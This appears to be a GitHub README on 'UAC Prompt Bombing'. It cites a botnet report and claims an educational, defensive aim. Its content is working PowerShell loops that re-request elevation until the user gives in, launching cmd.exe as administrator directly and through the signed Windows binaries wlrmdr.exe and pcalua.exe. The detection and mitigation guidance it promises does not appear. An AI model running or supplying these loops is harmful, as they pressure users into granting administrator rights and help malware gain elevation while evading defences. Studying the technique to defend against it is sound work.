# ⚡ UAC Prompt Bombing

---

In August 2025, eSentire's Threat Response Unit (TRU) discovered 
"NightshadeC2," a new botnet that uses "UAC Prompt Bombing" to bypass 
malware analysis sandboxes and exclude the final payload from Windows 
Defender. 

[Read Full article](https://www.esentire.com/blog/new-botnet-emerges-from-the-shadows-nightshadec2)

---

## 🎯 Purpose

This repo explores and educates about UAC Prompt Bombing — a technique where users get spammed with multiple prompts (legit or fake) in rapid succession. 😵‍💫
We’ll focus on human factors, defensive detection, and mitigation through safe simulations and visual demos.

---

🧠 Goal: Help blue-teamers, sysadmins, and researchers understand the risks and develop better safeguards — ethically and responsibly.

---

## prompt_simulation.ps1

```powershell
try {throw ""} catch { while ( -not $? ){try {Start-Process cmd.exe -Verb RunAs} catch {Get-Item "+++++++++++++++++"}}}
```


https://github.com/user-attachments/assets/0d8aa39d-ee15-4bd7-a2a0-20049e09b756

---

```powershell
try {
	throw ""
} catch {
	while ( -not $? ){
		try {
			Start-Process cmd.exe -Verb RunAs
		} catch {
			Write-Error "" -ErrorAction SilentlyContinue
		}
	}
}
```
---

## 🧰 LOLBins (Living-Off-The-Land Binaries)

### LOLBins are legitimate, signed system tools that attackers can abuse for malicious purposes. 🧨

#### .. /Wlrmdr.exe

```powershell
try {throw ""} catch {while ( -not $? ){try {Start-Process wlrmdr.exe -ArgumentList "-s 3600 -f 0 -t _ -m _ -a 11 -u cmd.exe"  -Verb RunAs} catch {Write-Error "" -ErrorAction SilentlyContinue}}}
```
<p align="center"><img src="https://github.com/user-attachments/assets/b61815ce-bf4c-4e13-b779-6b994f6c63b0" alt="UAC Prompt Bombing Screenshot" width="600"></p>


---

#### .. /Pcalua.exe 

```powershell
try {throw ""} catch {while ( -not $? ){try {Start-Process pcalua.exe -ArgumentList "-a cmd.exe"  -Verb RunAs} catch {Write-Error "" -ErrorAction SilentlyContinue}}}
```

<p align="center"><img src="https://github.com/user-attachments/assets/c3815d46-d745-4f0e-bb3b-d8e1d4ea6ba2" alt="UAC Prompt Bombing Screenshot" width="600"></p>

---


